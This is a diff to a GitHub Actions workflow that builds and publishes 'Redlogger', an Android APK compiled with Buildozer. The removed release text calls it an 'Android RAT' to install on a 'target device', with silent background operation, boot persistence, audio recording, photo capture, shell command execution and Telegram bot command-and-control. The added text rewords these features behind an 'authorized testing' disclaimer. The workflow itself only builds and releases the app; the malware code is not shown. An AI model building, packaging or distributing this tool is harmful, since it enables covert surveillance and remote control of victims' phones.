@@ -12,104 +12,96 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout repository
+    - name: 🧾 Checkout repository
       uses: actions/checkout@v4
 
-    - name: Set up Python
+    - name: 🐍 Set up Python
       uses: actions/setup-python@v4
       with:
         python-version: '3.10'
 
-    - name: Set up Java
+    - name: ☕ Set up Java
       uses: actions/setup-java@v3
       with:
         distribution: 'temurin'
         java-version: '17'
 
-    - name: Install system dependencies
+    - name: 🧱 Install system dependencies
       run: |
         sudo apt-get update
-        sudo apt-get install -y git zip unzip autoconf libtool pkg-config zlib1g-dev libncurses-dev cmake libffi-dev libssl-dev
+        sudo apt-get install -y git zip unzip autoconf libtool pkg-config zlib1g-dev \
+          libncurses-dev cmake libffi-dev libssl-dev openjdk-17-jdk curl
 
-    - name: Install Python dependencies
+    - name: 🐍 Install Python dependencies
       run: |
         python -m pip install --upgrade pip
         pip install buildozer cython
 
-    - name: Cache Buildozer global directory
+    - name: 💾 Cache Buildozer global directory
       uses: actions/cache@v3
       with:
         path: ~/.buildozer
-        key: buildozer-${{ runner.os }}-${{ hashFiles('redlogger_client/buildozer.spec') }}
+        key: buildozer-${{ runner.os }}-${{ hashFiles('**/buildozer.spec') }}
 
-    - name: Cache Buildozer dependencies
+    - name: 💾 Cache Buildozer project build
       uses: actions/cache@v3
       with:
         path: redlogger_client/.buildozer
-        key: buildozer-deps-${{ runner.os }}-${{ hashFiles('redlogger_client/buildozer.spec') }}
+        key: buildozer-deps-${{ runner.os }}-${{ hashFiles('**/buildozer.spec') }}
 
-    # 👇👇 أهم خطوة: تثبيت SDK يدوياً
-    - name: Manually install Android SDK cmdline-tools
+    - name: ⚙️ Manually install Android SDK cmdline-tools
       run: |
         mkdir -p ~/.buildozer/android/platform/android-sdk/cmdline-tools
         cd ~/.buildozer/android/platform/android-sdk/cmdline-tools
-        curl -o sdk.zip https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
-        unzip sdk.zip -d latest
+        curl -sSL -o sdk.zip https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
+        unzip -q sdk.zip -d latest
         rm sdk.zip
 
-    - name: Accept Android SDK licenses
-      run: yes | ~/.buildozer/android/platform/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses
+    - name: ✅ Accept Android SDK licenses
+      run: |
+        yes | ~/.buildozer/android/platform/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses
 
-    - name: Build Android APK
+    - name: 🏗️ Build APK with Buildozer
       working-directory: redlogger_client
       env:
         ANDROID_HOME: /home/runner/.buildozer/android/platform/android-sdk
-        PATH: /home/runner/.buildozer/android/platform/android-sdk/cmdline-tools/latest/bin:/usr/local/bin:/usr/bin:/bin
+        PATH: /home/runner/.buildozer/android/platform/android-sdk/cmdline-tools/latest/bin:$PATH
       run: |
         buildozer android debug
 
-    - name: List APK files
+    - name: 📂 List generated APKs
       working-directory: redlogger_client
       run: ls -la bin/
 
-    - name: Upload APK artifact
+    - name: ☁️ Upload APK artifact
       uses: actions/upload-artifact@v4
       with:
         name: redlogger-debug-apk
         path: redlogger_client/bin/*.apk
 
-    - name: Create Release (on tag)
+    - name: 🚀 Create GitHub Release (if tagged)
       if: startsWith(github.ref, 'refs/tags/')
       uses: softprops/action-gh-release@v1
       with:
         files: redlogger_client/bin/*.apk
         name: Redlogger ${{ github.ref_name }}
         body: |
-          ## Redlogger Android RAT - Release ${{ github.ref_name }}
+          ## Redlogger Android APK - v${{ github.ref_name }}
 
-          ### 📱 APK Download
-          Download the APK file below and install it on your target Android device.
+          ### 🔒 Warning
+          Use this tool only for authorized testing. Illegal usage is strictly prohibited.
 
-          ### ⚠️ Educational Use Only
-          This tool is for educational and authorized penetration testing purposes only.
+          ### 📦 APK Setup
+          - Install APK on test device
+          - Setup Telegram bot token and chat ID
+          - (Optional) Configure No-IP
 
-          ### 🔧 Setup Instructions
-          1. Download the APK
-          2. Configure your Telegram bot token and chat ID
-          3. Set up your No-IP domain (optional)
-          4. Install on target device
-          5. Start the controller server
-
-          ### 📋 Features
-          - Silent background operation
-          - Boot persistence
-          - Device information collection
-          - Audio recording
-          - Photo capture
+          ### ⚙️ Features
+          - Background execution
+          - Audio/photo capture
           - File management
-          - Shell command execution
-          - Telegram Bot C2
-          - No-IP DDNS support
+          - Telegram C2 communication
+
         draft: false
         prerelease: false
       env:
